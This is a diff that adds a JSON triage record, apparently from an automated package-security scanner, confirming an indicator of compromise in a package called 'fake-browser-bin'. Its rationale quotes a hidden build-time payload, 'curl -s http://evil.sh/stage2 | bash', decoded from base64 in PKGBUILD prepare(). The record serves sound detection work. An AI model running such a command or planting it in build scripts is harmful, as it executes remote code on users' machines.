@@ -1,0 +1,17 @@
+{
+  "branch": "triage/ioc-fake-browser-bin-cc9e2dec",
+  "event": "trustsight.confirmed-ioc",
+  "ioc_entries": [
+    {
+      "confidence": "high",
+      "provenance": "the base64-decoded payload in PKGBUILD prepare()",
+      "type": "domain",
+      "value": "evil.sh"
+    }
+  ],
+  "package": "fake-browser-bin",
+  "priority": "default",
+  "rationale": "The runtime supplies a decoded payload (curl -s http://evil.sh/stage2 | bash), and the package's prepare() stage actually executes this during build: it decodes the base64 string and pipes it to bash, so curl runs against evil.sh at build time - a real hidden payload that runs code the package should not.",
+  "title": "Confirmed IOC: fake-browser-bin",
+  "version_transition": "1.0-1 to 1.0-2"
+}
